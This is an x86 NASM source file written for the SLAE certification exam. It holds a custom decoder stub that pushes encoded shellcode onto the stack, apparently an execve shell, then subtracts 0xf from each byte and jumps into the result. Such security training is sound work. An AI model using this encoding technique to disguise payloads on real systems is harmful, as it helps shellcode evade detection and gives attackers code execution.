; Filename: assignment4.nasm
; Author:  Adam Brown
; Website:  https://coffeegist.com
;
;
; Purpose: Create a custom encoder/decoder for the SLAE exam

global _start

section .text
_start:

  ; Push shellcode onto stack in reverse order
  push 0x0f0f0f8f
  push 0xdc1abff0
  push 0x9862f198
  push 0x5ff2987d
  push 0x78713e77
  push 0x77823e3e
  push 0x775fcf40

  mov esi, esp ; Get address of first byte of shellcode
  mov eax, esi ; Save it

  jmp short decode ; Start decoding from first byte

decoder_loop:
  inc esi

decode:
  sub byte [esi], 0xf
  jnz short decoder_loop

  jmp eax  ; Jump to first byte of decoded shellcode
